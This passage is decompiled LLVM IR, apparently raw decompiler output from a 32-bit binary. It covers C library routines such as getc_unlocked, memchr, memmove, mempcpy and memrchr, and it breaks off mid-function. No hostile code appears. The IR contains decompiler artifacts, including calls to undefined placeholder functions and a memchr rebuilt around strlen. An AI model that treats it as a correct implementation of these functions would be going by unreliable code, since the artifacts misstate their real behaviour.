  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 10, 9, 11, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 15, 11, 12, 0, 14, 16, 13, 20, 17, 18, 19, 21, 22, 23, 24 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054e66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054e64, { 1, 0 }
  uselistorder label %dec_label_pc_8054de3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054d95, { 1, 0 }
  uselistorder label %dec_label_pc_8054d6d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054d3c, { 1, 0 }
  uselistorder label %dec_label_pc_8054d29, { 1, 0 }
  uselistorder label %dec_label_pc_8054d0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054cdc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054cc7, { 1, 0 }
  uselistorder label %dec_label_pc_8054cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8054c43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054bfb, { 1, 0 }
  uselistorder label %dec_label_pc_8054bcb.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8054b97, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054b66, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054b51, { 1, 0 }
  uselistorder label %dec_label_pc_8054a08, { 1, 0 }
  uselistorder label %dec_label_pc_805492c, { 1, 0 }
  uselistorder label %dec_label_pc_8054923, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_4()
  %stack_var_-5 = alloca i8, align 1
  %v0_8054ea0 = load i32, i32* @ebx, align 4
  %v4_8054ea4 = ptrtoint i16* %tmp to i32
  store i32 %v4_8054ea4, i32* @ebx, align 4
  %v1_8054ea8 = add i32 %v4_8054ea4, 16
  %v2_8054ea8 = inttoptr i32 %v1_8054ea8 to i32*
  %v3_8054ea8 = load i32, i32* %v2_8054ea8, align 4
  %v2_8054eab = add i32 %v4_8054ea4, 24
  %v3_8054eab = inttoptr i32 %v2_8054eab to i32*
  %v4_8054eab = load i32, i32* %v3_8054eab, align 4
  %v10_8054eab = icmp ult i32 %v3_8054ea8, %v4_8054eab
  br i1 %v10_8054eab, label %dec_label_pc_8054f4d, label %dec_label_pc_8054eb4

dec_label_pc_8054eb4:                             ; preds = %entry
  %v2_8054eb4 = load i16, i16* %tmp, align 2
  %v3_8054eb4 = zext i16 %v2_8054eb4 to i32
  %v1_8054eb7 = and i32 %v3_8054eb4, 131
  %v6_8054ec1 = icmp ugt i32 %v1_8054eb7, 128
  br i1 %v6_8054ec1, label %dec_label_pc_8054edb, label %dec_label_pc_8054ec3

dec_label_pc_8054ec3:                             ; preds = %dec_label_pc_8054eb4
  %v0_8054ec3 = load i32, i32* @edx, align 4
  %v6_8054ecb = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8054ec3, i32 %v0_8054ec3)
  %v1_8054ed3 = icmp eq i32 %v6_8054ecb, 0
  %v1_8054ed5 = icmp eq i1 %v1_8054ed3, false
  br i1 %v1_8054ed5, label %dec_label_pc_8054f72, label %dec_label_pc_8054ec3.dec_label_pc_8054edb_crit_edge

dec_label_pc_8054ec3.dec_label_pc_8054edb_crit_edge: ; preds = %dec_label_pc_8054ec3
  %v0_8054edb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054edb

dec_label_pc_8054edb:                             ; preds = %dec_label_pc_8054ec3.dec_label_pc_8054edb_crit_edge, %dec_label_pc_8054eb4
  %v2_8054f0f = phi i32 [ %v0_8054edb.pre, %dec_label_pc_8054ec3.dec_label_pc_8054edb_crit_edge ], [ %v4_8054ea4, %dec_label_pc_8054eb4 ]
  %v1_8054edb = inttoptr i32 %v2_8054f0f to i32*
  %v2_8054edb = load i32, i32* %v1_8054edb, align 4
  store i32 %v2_8054edb, i32* @ecx, align 4
  %v1_8054edd = urem i32 %v2_8054edb, 65536
  store i32 %v1_8054edd, i32* %edx.global-to-local, align 4
  %v2_8054ee0 = and i32 %v2_8054edb, 2
  %v3_8054ee0 = icmp eq i32 %v2_8054ee0, 0
  br i1 %v3_8054ee0, label %dec_label_pc_8054efe, label %dec_label_pc_8054ee5

dec_label_pc_8054ee5:                             ; preds = %dec_label_pc_8054edb
  %v1_8054ee5 = urem i32 %v2_8054edb, 2
  store i32 %v1_8054ee5, i32* %edx.global-to-local, align 4
  %v1_8054ee8 = add i32 %v2_8054edb, 65535
  %v1_8054eeb = trunc i32 %v1_8054ee8 to i16
  %v3_8054eeb = inttoptr i32 %v2_8054f0f to i16*
  store i16 %v1_8054eeb, i16* %v3_8054eeb, align 2
  %v0_8054eee = load i32, i32* @ebx, align 4
  %v1_8054eee = load i32, i32* %edx.global-to-local, align 4
  %v2_8054eee = mul i32 %v1_8054eee, 4
  %v3_8054eee = add i32 %v0_8054eee, 36
  %v4_8054eee = add i32 %v3_8054eee, %v2_8054eee
  %v5_8054eee = inttoptr i32 %v4_8054eee to i8*
  %v6_8054eee = load i8, i8* %v5_8054eee, align 1
  %v7_8054eee = zext i8 %v6_8054eee to i32
  %v9_8054eee = and i32 %v1_8054eee, -256
  %v10_8054eee = or i32 %v7_8054eee, %v9_8054eee
  store i32 %v10_8054eee, i32* %edx.global-to-local, align 4
  %v1_8054ef2 = add i32 %v0_8054eee, 40
  %v2_8054ef2 = inttoptr i32 %v1_8054ef2 to i32*
  store i32 0, i32* %v2_8054ef2, align 4
  %v0_8054ef9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054ef9 = urem i32 %v0_8054ef9, 256
  store i32 %v1_8054ef9, i32* @edx, align 4
  br label %dec_label_pc_8054f75

dec_label_pc_8054efe:                             ; preds = %dec_label_pc_8054edb
  %v1_8054efe = add i32 %v2_8054f0f, 16
  %v2_8054efe = inttoptr i32 %v1_8054efe to i32*
  %v3_8054efe = load i32, i32* %v2_8054efe, align 4
  %v1_8054f01 = add i32 %v2_8054f0f, 20
  %v2_8054f01 = inttoptr i32 %v1_8054f01 to i32*
  %v3_8054f01 = load i32, i32* %v2_8054f01, align 4
  %v15_8054f01 = icmp eq i32 %v3_8054f01, %v3_8054efe
  %v1_8054f04 = icmp eq i1 %v15_8054f01, false
  br i1 %v1_8054f04, label %dec_label_pc_8054f4d, label %dec_label_pc_8054f06

dec_label_pc_8054f06:                             ; preds = %dec_label_pc_8054efe
  %v1_8054f06 = add i32 %v2_8054f0f, 4
  %v2_8054f06 = inttoptr i32 %v1_8054f06 to i32*
  %v3_8054f06 = load i32, i32* %v2_8054f06, align 4
  %v13_8054f06 = icmp eq i32 %v3_8054f06, -2
  %v1_8054f0a = icmp eq i1 %v13_8054f06, false
  br i1 %v1_8054f0a, label %dec_label_pc_8054f14, label %dec_label_pc_8054f0c

dec_label_pc_8054f0c:                             ; preds = %dec_label_pc_8054f06
  %v1_8054f0c = or i32 %v2_8054edb, 4
  store i32 %v1_8054f0c, i32* @ecx, align 4
  %v1_8054f0f = trunc i32 %v1_8054f0c to i16
  %v3_8054f0f = inttoptr i32 %v2_8054f0f to i16*
  store i16 %v1_8054f0f, i16* %v3_8054f0f, align 2
  br label %dec_label_pc_8054f72

dec_label_pc_8054f14:                             ; preds = %dec_label_pc_8054f06
  %v1_8054f14 = udiv i32 %v2_8054edb, 256
  %v2_8054f14 = trunc i32 %v1_8054f14 to i8
  %v3_8054f14 = urem i8 %v2_8054f14, 4
  %v4_8054f14 = icmp eq i8 %v3_8054f14, 0
  %v8_8054f14 = zext i8 %v3_8054f14 to i32
  %v10_8054f14 = mul nuw nsw i32 %v8_8054f14, 256
  %v11_8054f14 = urem i32 %v2_8054edb, 256
  %v12_8054f14 = or i32 %v10_8054f14, %v11_8054f14
  store i32 %v12_8054f14, i32* %edx.global-to-local, align 4
  br i1 %v4_8054f14, label %dec_label_pc_8054f29, label %dec_label_pc_8054f19

dec_label_pc_8054f19:                             ; preds = %dec_label_pc_8054f14
  %v3_8054f21 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_80627dc.184 to i16*))
  %v0_8054f29.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054f29

dec_label_pc_8054f29:                             ; preds = %dec_label_pc_8054f14, %dec_label_pc_8054f19
  %v0_8054f5e = phi i32 [ %v2_8054f0f, %dec_label_pc_8054f14 ], [ %v0_8054f29.pre, %dec_label_pc_8054f19 ]
  %v1_8054f29 = add i32 %v0_8054f5e, 8
  %v2_8054f29 = inttoptr i32 %v1_8054f29 to i32*
  %v3_8054f29 = load i32, i32* %v2_8054f29, align 4
  %v1_8054f2c = add i32 %v0_8054f5e, 12
  %v2_8054f2c = inttoptr i32 %v1_8054f2c to i32*
  %v3_8054f2c = load i32, i32* %v2_8054f2c, align 4
  %v15_8054f2c = icmp eq i32 %v3_8054f2c, %v3_8054f29
  br i1 %v15_8054f2c, label %dec_label_pc_8054f56, label %dec_label_pc_8054f31

dec_label_pc_8054f31:                             ; preds = %dec_label_pc_8054f29
  %v2_8054f34 = add i32 %v0_8054f5e, 24
  %v3_8054f34 = inttoptr i32 %v2_8054f34 to i32*
  store i32 %v3_8054f29, i32* %v3_8054f34, align 4
  %v0_8054f37 = load i32, i32* @ebx, align 4
  %v2_8054f38 = call i32 @__stdio_rfill(i32 %v0_8054f37)
  %v1_8054f40 = icmp eq i32 %v2_8054f38, 0
  br i1 %v1_8054f40, label %dec_label_pc_8054f72, label %dec_label_pc_8054f44

dec_label_pc_8054f44:                             ; preds = %dec_label_pc_8054f31
  %v0_8054f44 = load i32, i32* @ebx, align 4
  %v1_8054f44 = add i32 %v0_8054f44, 20
  %v2_8054f44 = inttoptr i32 %v1_8054f44 to i32*
  %v3_8054f44 = load i32, i32* %v2_8054f44, align 4
  %v2_8054f47 = add i32 %v0_8054f44, 24
  %v3_8054f47 = inttoptr i32 %v2_8054f47 to i32*
  store i32 %v3_8054f44, i32* %v3_8054f47, align 4
  %v0_8054f4a = load i32, i32* @ebx, align 4
  %v1_8054f4a = add i32 %v0_8054f4a, 16
  %v2_8054f4a = inttoptr i32 %v1_8054f4a to i32*
  %v3_8054f4a = load i32, i32* %v2_8054f4a, align 4
  br label %dec_label_pc_8054f4d

dec_label_pc_8054f4d:                             ; preds = %dec_label_pc_8054efe, %entry, %dec_label_pc_8054f44
  %v1_8054f51 = phi i32 [ %v2_8054f0f, %dec_label_pc_8054efe ], [ %v4_8054ea4, %entry ], [ %v0_8054f4a, %dec_label_pc_8054f44 ]
  %v0_8054f4d = phi i32 [ %v3_8054efe, %dec_label_pc_8054efe ], [ %v3_8054ea8, %entry ], [ %v3_8054f4a, %dec_label_pc_8054f44 ]
  %v1_8054f4d = inttoptr i32 %v0_8054f4d to i8*
  %v2_8054f4d = load i8, i8* %v1_8054f4d, align 1
  %v3_8054f4d = zext i8 %v2_8054f4d to i32
  store i32 %v3_8054f4d, i32* @edx, align 4
  %v1_8054f50 = add i32 %v0_8054f4d, 1
  %v2_8054f51 = add i32 %v1_8054f51, 16
  %v3_8054f51 = inttoptr i32 %v2_8054f51 to i32*
  store i32 %v1_8054f50, i32* %v3_8054f51, align 4
  %v0_8054f75.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054f75

dec_label_pc_8054f56:                             ; preds = %dec_label_pc_8054f29
  %v2_8054f59 = ptrtoint i8* %stack_var_-5 to i32
  %v5_8054f5e = inttoptr i32 %v0_8054f5e to i16*
  %v5_8054f5f = call i32 @__stdio_READ(i16* %v5_8054f5e, i32 %v2_8054f59, i32 1)
  %v1_8054f67 = icmp eq i32 %v5_8054f5f, 0
  br i1 %v1_8054f67, label %dec_label_pc_8054f72, label %dec_label_pc_8054f6b

dec_label_pc_8054f6b:                             ; preds = %dec_label_pc_8054f56
  %v3_8054f6b = load i8, i8* %stack_var_-5, align 1
  %v4_8054f6b = sext i8 %v3_8054f6b to i32
  store i32 %v4_8054f6b, i32* @edx, align 4
  br label %dec_label_pc_8054f75

dec_label_pc_8054f72:                             ; preds = %dec_label_pc_8054f56, %dec_label_pc_8054f31, %dec_label_pc_8054ec3, %dec_label_pc_8054f0c
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8054f75

dec_label_pc_8054f75:                             ; preds = %dec_label_pc_8054f6b, %dec_label_pc_8054f4d, %dec_label_pc_8054ee5, %dec_label_pc_8054f72
  %v0_8054f75 = phi i32 [ %v4_8054f6b, %dec_label_pc_8054f6b ], [ %v0_8054f75.pre, %dec_label_pc_8054f4d ], [ %v1_8054ef9, %dec_label_pc_8054ee5 ], [ -1, %dec_label_pc_8054f72 ]
  store i32 %v0_8054ea0, i32* @ebx, align 4
  ret i32 %v0_8054f75

; uselistorder directives
  uselistorder i32 %v0_8054f4d, { 1, 0 }
  uselistorder i32 %v3_8054f29, { 1, 0 }
  uselistorder i32 %v0_8054f5e, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8054f14, { 1, 0 }
  uselistorder i32 %v3_8054efe, { 1, 0 }
  uselistorder i32 %v1_8054ef9, { 1, 0 }
  uselistorder i32 %v2_8054edb, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8054f0f, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8054f75, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8054f72, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8054f4d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054f29, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8054f7c = load i32, i32* @edi, align 4
  store i32 %v0_8054f7c, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8054f83 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054f83, i32* %edi.global-to-local, align 4
  %v1_8054f8b = icmp eq i32 %arg3, 0
  store i1 %v1_8054f8b, i1* %zf.global-to-local, align 1
  br i1 %v1_8054f8b, label %dec_label_pc_8054f9b, label %dec_label_pc_8054f8f

dec_label_pc_8054f8f:                             ; preds = %entry
  %v2_8054f8f = call i32 @_strlen(i8* %arg1)
  %v3_8054f8f = mul i32 %v2_8054f8f, -1
  %v4_8054f8f = add i32 %v3_8054f8f, -2
  store i32 %v4_8054f8f, i32* @ecx, align 4
  %v0_8054f91 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8054f91, label %dec_label_pc_8054f8f.dec_label_pc_8054f98_crit_edge, label %dec_label_pc_8054f93

dec_label_pc_8054f8f.dec_label_pc_8054f98_crit_edge: ; preds = %dec_label_pc_8054f8f
  %v0_8054f98.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8054f98.pre, -1
  br label %dec_label_pc_8054f98

dec_label_pc_8054f93:                             ; preds = %dec_label_pc_8054f8f
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054f98

dec_label_pc_8054f98:                             ; preds = %dec_label_pc_8054f8f.dec_label_pc_8054f98_crit_edge, %dec_label_pc_8054f93
  %v0_8054f98 = phi i32 [ %phitmp, %dec_label_pc_8054f8f.dec_label_pc_8054f98_crit_edge ], [ 0, %dec_label_pc_8054f93 ]
  %v8_8054f98 = icmp eq i32 %v0_8054f98, 0
  store i1 %v8_8054f98, i1* %zf.global-to-local, align 1
  store i32 %v0_8054f98, i32* %edi.global-to-local, align 4
  %v2_8054f9d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054f9b

dec_label_pc_8054f9b:                             ; preds = %entry, %dec_label_pc_8054f98
  %v2_8054f9d = phi i32 [ %v0_8054f7c, %entry ], [ %v2_8054f9d.pre, %dec_label_pc_8054f98 ]
  %v0_8054f9b = phi i32 [ 0, %entry ], [ %v0_8054f98, %dec_label_pc_8054f98 ]
  store i32 %v2_8054f9d, i32* @edi, align 4
  ret i32 %v0_8054f9b

; uselistorder directives
  uselistorder i32 %v0_8054f98, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8054f9b, { 1, 0 }
  uselistorder label %dec_label_pc_8054f98, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8054fa1 = load i32, i32* @esi, align 4
  store i32 %v0_8054fa1, i32* %stack_var_-8, align 4
  %v4_8054fa2 = ptrtoint i8* %arg1 to i32
  %v9_8054fae = icmp ugt i8* %tmp3, %arg1
  %v1_8054fb0 = icmp eq i1 %v9_8054fae, false
  br i1 %v1_8054fb0, label %dec_label_pc_8054fb8, label %dec_label_pc_8054fb2

dec_label_pc_8054fb2:                             ; preds = %entry
  %v7_8054fb4 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  %v8_8054fb4 = ptrtoint i8* %v7_8054fb4 to i32
  store i32 %v8_8054fb4, i32* @ecx, align 4
  br label %dec_label_pc_8054fc4

dec_label_pc_8054fb8:                             ; preds = %entry
  %v3_8054fb8 = add i32 %arg2, -1
  %v4_8054fb8 = add i32 %v3_8054fb8, %tmp
  %v5_8054fb8 = inttoptr i32 %v4_8054fb8 to i8*
  %v3_8054fbc = add i32 %v4_8054fa2, -1
  %v4_8054fbc = add i32 %v3_8054fbc, %tmp
  %v5_8054fbc = inttoptr i32 %v4_8054fbc to i8*
  %v7_8054fc1 = call i8* @_memcpy(i8* %v5_8054fbc, i8* %v5_8054fb8, i32 %tmp)
  %v8_8054fc1 = ptrtoint i8* %v7_8054fc1 to i32
  store i32 %v8_8054fc1, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8054fc4

dec_label_pc_8054fc4:                             ; preds = %dec_label_pc_8054fb2, %dec_label_pc_8054fb8
  %v2_8054fc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054fc4, i32* @esi, align 4
  ret i32 %v4_8054fa2

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054fc4, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8054fc8 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8054fdb = inttoptr i32 %arg1 to i16*
  %v4_8054fdb = call i32 @memcpy(i16* %v3_8054fdb, i32 %arg2, i32 %arg3)
  %v0_8054fe0 = load i32, i32* @esi, align 4
  %v2_8054fe0 = add i32 %v0_8054fe0, %arg3
  store i32 %v0_8054fc8, i32* @esi, align 4
  ret i32 %v2_8054fe0
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8054ff1 = urem i32 %arg2, 256
  %v4_8054ffd = sext i8 %arg1 to i32
  %v2_8055001 = add i32 %v4_8054ffd, %arg3
  %v1_80550136 = icmp eq i32 %arg3, 0
  br i1 %v1_80550136, label %dec_label_pc_805501b, label %dec_label_pc_8055017

dec_label_pc_8055005:                             ; preds = %dec_label_pc_8055017
  %v1_8055005 = add i32 %v0_8055005, -1
  %v5_8055006 = load i32, i32* @edx, align 4
  %v6_8055006 = and i32 %v5_8055006, -256
  %v7_8055006 = or i32 %v6_8055006, %v4_8054ff1
  store i32 %v7_8055006, i32* @edx, align 4
  %v1_805500a = inttoptr i32 %v1_8055005 to i8*
  %v2_805500a = load i8, i8* %v1_805500a, align 1
  %v15_805500a = icmp eq i8 %v2_805500a, %tmp
  br i1 %v15_805500a, label %dec_label_pc_8055098, label %dec_label_pc_8055012

dec_label_pc_8055012:                             ; preds = %dec_label_pc_8055005
  %v1_8055012 = add i32 %v0_8055012, -1
  %v8_8055012 = icmp eq i32 %v1_8055012, 0
  br i1 %v8_8055012, label %dec_label_pc_805501b, label %dec_label_pc_8055017

dec_label_pc_8055017:                             ; preds = %entry, %dec_label_pc_8055012
  %v0_8055012 = phi i32 [ %v1_8055012, %dec_label_pc_8055012 ], [ %arg3, %entry ]
  %v0_8055005 = phi i32 [ %v1_8055005, %dec_label_pc_8055012 ], [ %v2_8055001, %entry ]
  %v2_8055017 = urem i32 %v0_8055005, 4
  %v3_8055017 = icmp eq i32 %v2_8055017, 0
  %v1_8055019 = icmp eq i1 %v3_8055017, false
  br i1 %v1_8055019, label %dec_label_pc_8055005, label %dec_label_pc_805501b

dec_label_pc_805501b:                             ; preds = %dec_label_pc_8055012, %dec_label_pc_8055017, %entry
  %v0_805507e.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8055012 ], [ %v0_8055012, %dec_label_pc_8055017 ]
  %v0_8055020 = phi i32 [ %v2_8055001, %entry ], [ %v1_8055005, %dec_label_pc_8055012 ], [ %v0_8055005, %dec_label_pc_8055017 ]
  store i32 %v0_8055020, i32* @ecx, align 4
  %v2_8055024 = mul nuw nsw i32 %v4_8054ff1, 256
  %v2_8055027 = or i32 %v2_8055024, %v4_8054ff1
  %v2_805502b = mul i32 %v2_8055027, 65536
  %v2_805502e = or i32 %v2_805502b, %v2_8055027
  %v6_805508152 = icmp ugt i32 %v0_805507e.pr, 3
  br i1 %v6_805508152, label %dec_label_pc_8055032, label %dec_label_pc_8055083

dec_label_pc_8055032:                             ; preds = %dec_label_pc_805501b, %dec_label_pc_805507b
  %v0_805507b54 = phi i32 [ %v1_805507b, %dec_label_pc_805507b ], [ %v0_805507e.pr, %dec_label_pc_805501b ]
  %v0_805503253 = phi i32 [ %v1_8055032, %dec_label_pc_805507b ], [ %v0_8055020, %dec_label_pc_805501b ]
  %v1_8055032 = add i32 %v0_805503253, -4
  store i32 %v1_8055032, i32* @ecx, align 4
  %v2_8055037 = inttoptr i32 %v1_8055032 to i32*
  %v3_8055037 = load i32, i32* %v2_8055037, align 4
  %v4_8055037 = xor i32 %v3_8055037, %v2_805502e
  %v1_8055039 = add i32 %v4_8055037, 2130640639
  %v1_805503f = sub i32 -1, %v4_8055037
  %v2_8055041 = xor i32 %v1_8055039, %v1_805503f
  %v1_8055043 = and i32 %v2_8055041, -2130640640
  %v2_8055043 = icmp eq i32 %v1_8055043, 0
  br i1 %v2_8055043, label %dec_label_pc_805507b, label %dec_label_pc_805504b

dec_label_pc_805504b:                             ; preds = %dec_label_pc_8055032
  %v7_805504b = or i32 %v1_8055043, %v4_8054ff1
  %v1_805504f = add i32 %v0_805503253, -1
  %v2_8055052 = inttoptr i32 %v1_805504f to i8*
  %v3_8055052 = load i8, i8* %v2_8055052, align 1
  %v16_8055052 = icmp eq i8 %v3_8055052, %tmp
  br i1 %v16_8055052, label %dec_label_pc_8055098, label %dec_label_pc_8055057

dec_label_pc_8055057:                             ; preds = %dec_label_pc_805504b
  %v1_805505b = add i32 %v0_805503253, -2
  %v2_805505e = inttoptr i32 %v1_805505b to i8*
  %v3_805505e = load i8, i8* %v2_805505e, align 1
  %v16_805505e = icmp eq i8 %v3_805505e, %tmp
  br i1 %v16_805505e, label %dec_label_pc_8055098, label %dec_label_pc_8055063

dec_label_pc_8055063:                             ; preds = %dec_label_pc_8055057
  %v1_8055067 = add i32 %v0_805503253, -3
  %v2_805506a = inttoptr i32 %v1_8055067 to i8*
  %v3_805506a = load i8, i8* %v2_805506a, align 1
  %v16_805506a = icmp eq i8 %v3_805506a, %tmp
  br i1 %v16_805506a, label %dec_label_pc_8055098, label %dec_label_pc_805506f

dec_label_pc_805506f:                             ; preds = %dec_label_pc_8055063
  %v1_8055073 = inttoptr i32 %v1_8055032 to i8*
  %v2_8055073 = load i8, i8* %v1_8055073, align 1
  %v15_8055073 = icmp eq i8 %v2_8055073, %tmp
  %v1_8055075 = icmp eq i1 %v15_8055073, false
  br i1 %v1_8055075, label %dec_label_pc_805507b, label %dec_label_pc_8055077

dec_label_pc_8055077:                             ; preds = %dec_label_pc_805506f
  br label %dec_label_pc_8055098

dec_label_pc_805507b:                             ; preds = %dec_label_pc_805506f, %dec_label_pc_8055032
  %v5_805508826 = phi i32 [ %v7_805504b, %dec_label_pc_805506f ], [ 0, %dec_label_pc_8055032 ]
  %v1_805507b = add i32 %v0_805507b54, -4
  %v6_8055081 = icmp ugt i32 %v1_805507b, 3
  br i1 %v6_8055081, label %dec_label_pc_8055032, label %dec_label_pc_8055083

dec_label_pc_8055083:                             ; preds = %dec_label_pc_805507b, %dec_label_pc_805501b
  %v5_805508825.lcssa = phi i32 [ %v4_8054ff1, %dec_label_pc_805501b ], [ %v5_805508826, %dec_label_pc_805507b ]
  %v0_8055032.lcssa = phi i32 [ %v0_8055020, %dec_label_pc_805501b ], [ %v1_8055032, %dec_label_pc_805507b ]
  %v0_805507b.lcssa = phi i32 [ %v0_805507e.pr, %dec_label_pc_805501b ], [ %v1_805507b, %dec_label_pc_805507b ]
  br label %dec_label_pc_8055090

dec_label_pc_8055087:                             ; preds = %dec_label_pc_8055090
  %v1_8055090 = add i32 %v0_8055090, -1
  %v1_8055087 = add i32 %v0_8055087, -1
  %v6_8055088 = and i32 %v5_8055088, -256
  %v7_8055088 = or i32 %v6_8055088, %v4_8054ff1
  %v1_805508c = inttoptr i32 %v1_8055087 to i8*
  %v2_805508c = load i8, i8* %v1_805508c, align 1
  %v15_805508c = icmp eq i8 %v2_805508c, %tmp
  br i1 %v15_805508c, label %dec_label_pc_8055098, label %dec_label_pc_8055090

dec_label_pc_8055090:                             ; preds = %dec_label_pc_8055087, %dec_label_pc_8055083
  %v5_8055088 = phi i32 [ %v7_8055088, %dec_label_pc_8055087 ], [ %v5_805508825.lcssa, %dec_label_pc_8055083 ]
  %v0_8055087 = phi i32 [ %v1_8055087, %dec_label_pc_8055087 ], [ %v0_8055032.lcssa, %dec_label_pc_8055083 ]
  %v0_8055090 = phi i32 [ %v1_8055090, %dec_label_pc_8055087 ], [ %v0_805507b.lcssa, %dec_label_pc_8055083 ]
  %v10_8055091 = icmp eq i32 %v0_8055090, 0
  %v1_8055094 = icmp eq i1 %v10_8055091, false
  br i1 %v1_8055094, label %dec_label_pc_8055087, label %dec_label_pc_8055096

dec_label_pc_8055096:                             ; preds = %dec_label_pc_8055090
  br label %dec_label_pc_8055098

dec_label_pc_8055098:                             ; preds = %dec_label_pc_8055005, %dec_label_pc_8055063, %dec_label_pc_8055057, %dec_label_pc_805504b, %dec_label_pc_8055087, %dec_label_pc_8055077, %dec_label_pc_8055096
  %v0_805509b = phi i32 [ %v1_8055032, %dec_label_pc_8055077 ], [ 0, %dec_label_pc_8055096 ], [ %v1_8055087, %dec_label_pc_8055087 ], [ %v1_8055067, %dec_label_pc_8055063 ], [ %v1_805505b, %dec_label_pc_8055057 ], [ %v1_805504f, %dec_label_pc_805504b ], [ %v1_8055005, %dec_label_pc_8055005 ]
  ret i32 %v0_805509b

; uselistorder directives
  uselistorder i32 %v0_8055090, { 1, 0 }
  uselistorder i32 %v1_805507b, { 0, 2, 1 }
  uselistorder i32 %v1_8055032, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805503253, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8055027, { 1, 0 }
  uselistorder i32 %v0_8055005, { 1, 0, 2 }
  uselistorder i32 %v2_8055001, { 1, 0 }
  uselistorder i32 %v4_8054ff1, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055098, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055032, { 1, 0 }
  uselistorder label %dec_label_pc_805501b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055017, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805509c = load i32, i32* @edi, align 4
